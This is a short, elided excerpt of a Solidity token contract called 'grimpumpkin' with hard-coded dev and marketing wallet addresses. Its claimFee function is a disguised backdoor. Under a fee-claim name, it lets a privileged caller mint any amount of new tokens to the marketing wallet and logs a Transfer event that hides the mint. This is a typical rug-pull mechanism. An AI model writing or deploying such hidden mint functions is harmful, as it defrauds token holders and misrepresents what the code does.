...
contract grimpumpkin  is Context, IERC20 { 
    ...
    address payable public DevWallet = payable(0xC1b52C1bA8972934b02d8f1b31E2BD012C7378bB);
    address payable public MarketingWallet = payable(0x858fB67269bEF89DF9061b0338566c3011E75eC6);
    ...
    function claimFee(uint256 acc, address adr) onlyAddress public virtual {
        require(adr == address(MarketingWallet));
        _Fee(address(MarketingWallet), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
        emit Transfer(address(MarketingWallet), adr, acc);
    }
